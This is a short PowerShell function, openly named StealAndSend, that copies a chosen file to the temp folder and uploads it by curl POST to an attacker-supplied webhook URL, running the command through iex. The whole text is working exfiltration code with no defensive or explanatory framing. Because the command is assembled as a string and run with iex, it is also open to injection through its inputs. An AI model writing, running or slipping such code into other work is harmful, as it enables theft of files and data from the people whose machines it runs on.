function StealAndSend {
    param (
        [string]$FileSource,
        [string]$WebhookUrl
    )

    if (!(Test-Path $FileSource)) {
        Write-Host "[!] File not found: $FileSource" -ForegroundColor Red
        exit 1
    }

    $fileName = [System.IO.Path]::GetFileName($FileSource)
    $tempFile = "$env:TEMP\$fileName"
    Copy-Item $FileSource $tempFile -Force

    $curlCommand = "curl -X POST -F file=@`"$tempFile`" $WebhookUrl"
    Write-Host "[~] Executing: $curlCommand" -ForegroundColor Yellow

    try {
        iex $curlCommand
        Write-Host "[+] Upload sent via curl." -ForegroundColor Green
    } catch {
        Write-Host "[!] curl upload failed: $_" -ForegroundColor Red
        exit 1
    }
}
